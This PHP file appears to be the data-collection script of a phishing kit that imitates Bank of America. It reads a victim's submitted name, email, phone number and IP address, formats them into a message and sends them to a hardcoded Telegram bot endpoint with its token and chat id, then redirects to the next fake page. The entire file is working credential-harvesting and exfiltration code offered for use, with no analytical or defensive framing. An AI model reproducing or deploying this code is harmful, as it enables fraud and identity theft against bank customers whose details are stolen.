<?php

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$firstname = $_POST['fname'];
$lastname  = $_POST['lname'];
$address   = $_POST['aii'];
$phone     = $_POST['ph'];





# Messsage

$message = "[👑 |  BOA  | TH3 BANK3R :{$client} 👑]\n\n";

$message .= " [ ADDRESS INFORMATION ] \n";
$message .= " \n";
$message .= "| 🔐[ B I L L I M G ~ D E T A I L S ]🔐 \n";
$message .= "|==============================|\n";
$message .= "| FIRSTNAME : {$firstname}\n";
$message .= "| LASTNAME : {$lastname}\n";
$message .= "| EMAIL  : {$address}\n";
$message .= "| PHONE    : +1{$phone}\n";
$message .= "|==============================|\n";
$message .= " \n";

$message .= "# IP ADDRESS : {$IP}\n";
$message .= "|==============================|\n";
$message .= " \n";


# Send Mail 
file_get_contents("https://api.telegram.org/bot5892595107:AAH_MFO2RNerCTGfDDMk1zg2tdePwSZ8Tkg/sendMessage?chat_id=-830196354&text=" . urlencode($message)."" );

header('Location: ../boa3.php');

?>
